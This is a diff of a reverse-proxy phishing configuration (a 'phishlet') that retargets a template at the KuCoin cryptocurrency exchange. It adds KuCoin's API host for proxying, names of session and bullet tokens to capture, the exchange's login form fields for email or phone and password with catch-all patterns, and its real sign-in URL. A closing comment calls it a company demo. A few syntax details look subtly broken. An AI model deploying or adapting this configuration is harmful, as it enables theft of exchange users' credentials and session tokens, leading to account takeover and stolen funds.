@@ -24,14 +24,14 @@ sub_filters:
   - { hostname: '{api.kucoin.com', sub: 'api', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
 
 auth_tokens:
-  - domain: '{domain}'
-    keys: ['session']
+  - domain: 'kucoin.com'
+    keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
 
 credentials:
-  - key: 'username'
+  - key: 'Email/Phone Number'
     search: ['(.*)']
     type: 'post'
-  - key: 'password'
+  - key: 'Login Password'
     search: ['(.*)']
     type: 'post'
 
@@ -39,6 +39,7 @@ credentials:
 login:
   username: user
   password: pass
-  url: https://www.{domain}/login
+  url: https://www.kucoin.com/ucenter/signin
 
 # This is a demo example of a phishlet for 3.0 for my company Rencora
+
